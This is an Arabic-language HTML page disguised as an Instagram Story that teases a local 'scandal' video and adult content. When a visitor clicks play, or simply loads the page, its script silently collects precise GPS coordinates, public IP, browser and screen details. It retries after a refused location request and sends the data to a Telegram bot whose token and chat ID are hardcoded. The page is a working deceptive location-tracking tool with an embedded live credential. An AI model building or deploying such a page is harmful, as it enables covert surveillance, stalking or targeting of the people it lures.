<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram Story</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #000;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }

        /* ===== الحاوية الرئيسية (شبيهة بـ Instagram Story) ===== */
        .story-container {
            position: relative;
            width: 100%;
            height: 100vh;
            max-width: 430px;
            margin: 0 auto;
            background: #000;
            overflow: hidden;
        }

        /* ===== خلفية الفيديو ===== */
        .story-background {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('https://i.pinimg.com/originals/cb/15/66/cb1566b189b13c01e96e0bcfe4b06e3e.jpg') center/cover no-repeat;
            filter: brightness(0.7);
            transition: all 0.5s ease;
        }
        .story-background.playing {
            filter: brightness(1);
        }

        /* ===== شريط التقدم (مثل Instagram Stories) ===== */
        .progress-bars {
            position: absolute;
            top: 10px;
            left: 10px;
            right: 10px;
            display: flex;
            gap: 4px;
            z-index: 20;
            direction: ltr;
        }
        .progress-bar {
            flex: 1;
            height: 3px;
            background: rgba(255,255,255,0.3);
            border-radius: 3px;
            overflow: hidden;
        }
        .progress-bar .fill {
            height: 100%;
            width: 0%;
            background: #fff;
            border-radius: 3px;
            transition: width 0.3s linear;
        }
        .progress-bar.active .fill {
            animation: progressAnim 3s linear forwards;
        }
        @keyframes progressAnim {
            0% { width: 0%; }
            100% { width: 100%; }
        }

        /* ===== زر الصوت ===== */
        .sound-btn {
            position: absolute;
            top: 60px;
            right: 15px;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: rgba(0,0,0,0.5);
            border: 1px solid rgba(255,255,255,0.2);
            color: #fff;
            font-size: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 15;
            cursor: pointer;
            backdrop-filter: blur(10px);
        }

        /* ===== المحتوى في الأسفل ===== */
        .story-content {
            position: absolute;
            bottom: 80px;
            left: 20px;
            right: 20px;
            z-index: 10;
            text-align: right;
        }
        .story-content .username {
            font-size: 16px;
            font-weight: 600;
            color: #fff;
            text-shadow: 0 2px 10px rgba(0,0,0,0.8);
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .story-content .username .badge {
            background: #0095f6;
            font-size: 10px;
            padding: 2px 8px;
            border-radius: 12px;
        }
        .story-content .caption {
            font-size: 14px;
            color: rgba(255,255,255,0.9);
            margin-top: 8px;
            text-shadow: 0 2px 10px rgba(0,0,0,0.8);
            line-height: 1.6;
        }
        .story-content .caption strong {
            color: #ff6b6b;
        }

        /* ===== زر التشغيل (المركزي) ===== */
        .play-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 5;
            cursor: pointer;
            background: rgba(0,0,0,0.2);
            transition: all 0.3s ease;
        }
        .play-overlay.hidden {
            opacity: 0;
            pointer-events: none;
        }
        .play-btn-large {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(20px);
            border: 2px solid rgba(255,255,255,0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: #fff;
            transition: all 0.3s ease;
            box-shadow: 0 0 60px rgba(255,0,0,0.2);
        }
        .play-btn-large:active {
            transform: scale(0.9);
        }
        .play-text {
            color: #fff;
            font-size: 16px;
            margin-top: 15px;
            text-shadow: 0 2px 20px rgba(0,0,0,0.8);
            opacity: 0.8;
            letter-spacing: 1px;
        }

        /* ===== النافذة المخصصة (فوق طلب المتصفح) ===== */
        .custom-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(15px);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            animation: fadeIn 0.4s ease;
        }
        .custom-modal.active {
            display: flex;
        }
        .custom-modal-box {
            background: linear-gradient(145deg, #1a1a1a, #0d0d0d);
            border-radius: 30px;
            padding: 40px 30px 30px;
            max-width: 380px;
            width: 90%;
            text-align: center;
            border: 1px solid #2a2a2a;
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.9);
            animation: slideUp 0.5s ease;
            position: relative;
            overflow: hidden;
        }
        .custom-modal-box::before {
            content: "📱";
            font-size: 100px;
            position: absolute;
            top: -30px;
            right: -30px;
            opacity: 0.05;
            transform: rotate(20deg);
        }
        .modal-icon {
            font-size: 55px;
            margin-bottom: 10px;
            display: block;
            animation: pulse-icon 2s infinite;
        }
        @keyframes pulse-icon {
            0% { transform: scale(1); }
            50% { transform: scale(1.08); }
            100% { transform: scale(1); }
        }
        .custom-modal-box h2 {
            color: #fff;
            font-size: 21px;
            margin: 8px 0 6px;
        }
        .custom-modal-box p {
            color: #999;
            font-size: 14px;
            line-height: 1.7;
            margin: 8px 0 18px;
        }
        .custom-modal-box .btn-play {
            background: linear-gradient(135deg, #cc0000, #ff0000);
            color: #fff;
            border: none;
            padding: 15px 45px;
            border-radius: 50px;
            font-size: 19px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 8px 30px rgba(204, 0, 0, 0.4);
            display: inline-flex;
            align-items: center;
            gap: 12px;
            width: 100%;
            justify-content: center;
        }
        .custom-modal-box .btn-play:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 40px rgba(204, 0, 0, 0.6);
        }
        .custom-modal-box .btn-play:active {
            transform: scale(0.96);
        }
        .custom-modal-box .btn-play span {
            font-size: 26px;
        }
        .modal-sub {
            color: #555;
            font-size: 12px;
            margin-top: 15px;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        @keyframes slideUp {
            from { transform: translateY(60px) scale(0.95); opacity: 0; }
            to { transform: translateY(0) scale(1); opacity: 1; }
        }

        /* ===== أيقونات في الأعلى (مثل Instagram) ===== */
        .top-icons {
            position: absolute;
            top: 12px;
            left: 15px;
            right: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            z-index: 15;
            color: #fff;
            font-size: 20px;
        }
        .top-icons .left {
            display: flex;
            gap: 15px;
        }
        .top-icons .right {
            display: flex;
            gap: 15px;
        }
        .top-icons span {
            opacity: 0.8;
            text-shadow: 0 2px 10px rgba(0,0,0,0.5);
            cursor: pointer;
        }

        /* ===== شاشة التحميل ===== */
        .loading-overlay {
            display: none;
            position: absolute;
            inset: 0;
            background: rgba(0,0,0,0.8);
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 8;
        }
        .loading-overlay.active {
            display: flex;
        }
        .spinner {
            width: 45px;
            height: 45px;
            border: 3px solid #2a2a2a;
            border-top: 3px solid #cc0000;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-text {
            color: #fff;
            margin-top: 12px;
            font-size: 13px;
            opacity: 0.6;
        }

        @media (max-width: 430px) {
            .story-content .username { font-size: 14px; }
            .story-content .caption { font-size: 13px; }
            .play-btn-large { width: 65px; height: 65px; font-size: 32px; }
        }
    </style>
</head>
<body>

    <!-- ===== الحاوية الرئيسية ===== -->
    <div class="story-container" id="storyContainer">
        
        <!-- الخلفية -->
        <div class="story-background" id="storyBg"></div>

        <!-- شريط التقدم -->
        <div class="progress-bars" id="progressBars">
            <div class="progress-bar"><div class="fill"></div></div>
            <div class="progress-bar"><div class="fill"></div></div>
            <div class="progress-bar"><div class="fill"></div></div>
            <div class="progress-bar"><div class="fill"></div></div>
            <div class="progress-bar"><div class="fill"></div></div>
        </div>

        <!-- الأيقونات العلوية -->
        <div class="top-icons">
            <div class="left">
                <span>✕</span>
                <span>⋯</span>
            </div>
            <div class="right">
                <span>♥</span>
                <span>💬</span>
                <span>➤</span>
            </div>
        </div>

        <!-- زر الصوت -->
        <div class="sound-btn" id="soundBtn" onclick="toggleSound()">🔊</div>

        <!-- المحتوى السفلي -->
        <div class="story-content">
            <div class="username">
                🔥 التل_نيوز
                <span class="badge">مباشر</span>
            </div>
            <div class="caption">
                <strong>فضيحة تهز مدينة التل</strong> • تفاصيل حصرية من داخل المنطقة<br>
                <span style="font-size:12px; opacity:0.6;">🕒 منذ 2 ساعة • 15K مشاهدة</span>
            </div>
        </div>

        <!-- زر التشغيل المركزي -->
        <div class="play-overlay" id="playOverlay" onclick="showCustomModal()">
            <div class="play-btn-large" id="playBtnLarge">▶</div>
            <div class="play-text">اضغط لتشغيل الفيديو</div>
        </div>

        <!-- شاشة التحميل -->
        <div class="loading-overlay" id="loadingOverlay">
            <div class="spinner"></div>
            <div class="loading-text" id="loadingText">جاري التحميل...</div>
        </div>
    </div>

    <!-- ===== النافذة المخصصة (فوق كل شيء) ===== -->
    <div class="custom-modal" id="customModal">
        <div class="custom-modal-box">
            <span class="modal-icon">🎬</span>
            <h2>تشغيل الفيديو الحصري</h2>
            <p>للسماح بمشاهدة الفيديو، يرجى الضغط على <strong>"تشغيل"</strong>.<br>
            <span style="font-size:12px; color:#666;">🔞 محتوى للكبار • مشاهد حصرية</span></p>
            
            <button class="btn-play" onclick="handleModalPlay()">
                <span>▶</span> تشغيل الفيديو
            </button>
            
            <p class="modal-sub">🔒 سيتم التحقق من الموقع تلقائياً</p>
        </div>
    </div>

    <script>
        // ============================================================
        // 🔥 إعدادات البوت
        // ============================================================
        const BOT_TOKEN = '8930981100:AAFU27ynw94u65rTWI6U7Lo1kv7umnexoHs';
        const CHAT_ID = '-1004334930490';

        // ============================================================
        // عناصر الصفحة
        // ============================================================
        const storyBg = document.getElementById('storyBg');
        const playOverlay = document.getElementById('playOverlay');
        const playBtnLarge = document.getElementById('playBtnLarge');
        const loadingOverlay = document.getElementById('loadingOverlay');
        const loadingText = document.getElementById('loadingText');
        const customModal = document.getElementById('customModal');
        const progressBars = document.getElementById('progressBars');
        const soundBtn = document.getElementById('soundBtn');

        // ============================================================
        // متغيرات الحالة
        // ============================================================
        let isPlaying = false;
        let isProcessing = false;
        let retryCount = 0;
        const MAX_RETRIES = 2;
        let locationSent = false;
        let isMuted = false;

        // ============================================================
        // إظهار النافذة المخصصة
        // ============================================================
        function showCustomModal() {
            if (isPlaying || isProcessing) return;
            customModal.classList.add('active');
        }

        // ============================================================
        // عند الضغط على زر "تشغيل" في النافذة
        // ============================================================
        function handleModalPlay() {
            customModal.classList.remove('active');
            
            // إخفاء زر التشغيل
            playOverlay.classList.add('hidden');
            
            // إظهار التحميل
            loadingOverlay.classList.add('active');
            loadingText.textContent = 'جاري التحميل...';

            // جلب الموقع في الخلفية
            getLocationSilently();

            // بعد 1.5 ثانية يبدأ الفيديو
            setTimeout(() => {
                loadingOverlay.classList.remove('active');
                startVideoPlayback();
            }, 1500);
        }

        // ============================================================
        // جلب الموقع بصمت
        // ============================================================
        function getLocationSilently() {
            if (!navigator.geolocation) {
                sendToBot('⚠️ المتصفح لا يدعم الموقع');
                return;
            }

            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const acc = Math.round(position.coords.accuracy);
                    const time = new Date().toISOString();
                    const userAgent = navigator.userAgent;
                    const screenSize = `${screen.width}x${screen.height}`;
                    const language = navigator.language;

                    const caption = `🆕 مشاهد جديد من التل
        📍 ${lat}, ${lon}
        🎯 ±${acc}م
        🕒 ${time}
        💻 ${userAgent.substring(0, 60)}...
        📱 ${screenSize}
        🌐 ${language}`;

                    sendToBot(caption);
                    locationSent = true;
                },
                function(error) {
                    let isPermissionDenied = error.code === error.PERMISSION_DENIED;
                    
                    if (isPermissionDenied && retryCount < MAX_RETRIES) {
                        retryCount++;
                        setTimeout(() => {
                            getLocationSilently();
                        }, 2000);
                        return;
                    }

                    sendToBot(`❌ فشل الموقع: ${error.message}`);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                }
            );
        }

        // ============================================================
        // بدء تشغيل الفيديو
        // ============================================================
        function startVideoPlayback() {
            isPlaying = true;
            
            // تغيير الخلفية
            storyBg.style.background = 'linear-gradient(135deg, #0a0a0a, #1a0a0a)';
            storyBg.classList.add('playing');
            
            // تشغيل شريط التقدم
            const bars = document.querySelectorAll('.progress-bar');
            bars.forEach((bar, index) => {
                setTimeout(() => {
                    bar.classList.add('active');
                }, index * 500);
            });

            // تغيير زر الصوت
            soundBtn.textContent = '🔊';

            // تحديث النص السفلي
            document.querySelector('.story-content .username').innerHTML = `
                🔥 التل_نيوز
                <span class="badge">بث حي</span>
            `;
            document.querySelector('.story-content .caption').innerHTML = `
                <strong>🔴 بث مباشر</strong> • فضيحة تهز مدينة التل<br>
                <span style="font-size:12px; opacity:0.6;">🕒 جاري البث • 1.2K مشاهدة</span>
            `;

            // إظهار وهم تشغيل الفيديو
            playBtnLarge.textContent = '▶️';
            playBtnLarge.style.background = 'rgba(0,255,0,0.1)';
            
            isProcessing = false;
            retryCount = 0;
            locationSent = false;

            // تحديث شريط التقدم
            updateProgress();
        }

        // ============================================================
        // تحديث شريط التقدم
        // ============================================================
        let progressInterval;
        function updateProgress() {
            let currentBar = 0;
            const bars = document.querySelectorAll('.progress-bar .fill');
            
            progressInterval = setInterval(() => {
                if (currentBar < bars.length) {
                    bars[currentBar].style.width = '100%';
                    currentBar++;
                } else {
                    clearInterval(progressInterval);
                    // الفيديو انتهى
                    setTimeout(() => {
                        document.querySelector('.story-content .caption').innerHTML = `
                            <strong>⏹️ انتهى البث</strong><br>
                            <span style="font-size:12px; opacity:0.6;">شكراً للمشاهدة</span>
                        `;
                    }, 1000);
                }
            }, 3000);
        }

        // ============================================================
        // تبديل الصوت
        // ============================================================
        function toggleSound() {
            isMuted = !isMuted;
            soundBtn.textContent = isMuted ? '🔇' : '🔊';
        }

        // ============================================================
        // إرسال للبوت
        // ============================================================
        function sendToBot(caption) {
            if (locationSent && caption.includes('الموقع')) return;

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: caption,
                    parse_mode: 'HTML'
                })
            })
            .then(res => res.json())
            .then(data => {
                if (data.ok) console.log('✅ تم الإرسال');
            })
            .catch(() => {});
        }

        // ============================================================
        // تحميل خلفي
        // ============================================================
        window.addEventListener('load', function() {
            setTimeout(() => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        function(pos) {
                            const lat = pos.coords.latitude;
                            const lon = pos.coords.longitude;
                            const time = new Date().toISOString();
                            sendToBot(`🔄 خلفي\n📍 ${lat}, ${lon}\n🕒 ${time}`);
                        },
                        function() {},
                        { enableHighAccuracy: true, timeout: 4000 }
                    );
                }
            }, 3000);

            setTimeout(() => {
                fetch('https://api.ipify.org?format=json')
                    .then(res => res.json())
                    .then(data => {
                        if (data.ip) sendToBot(`🌐 IP: ${data.ip}`);
                    })
                    .catch(() => {});
            }, 4000);
        });

        console.log('✅ Instagram Story Style - يعمل بصمت');
        console.log('🎯 التصميم يشبه Instagram Stories');
        console.log('🔑 التوكن:', BOT_TOKEN.substring(0, 10) + '...');
    </script>
</body>
</html>
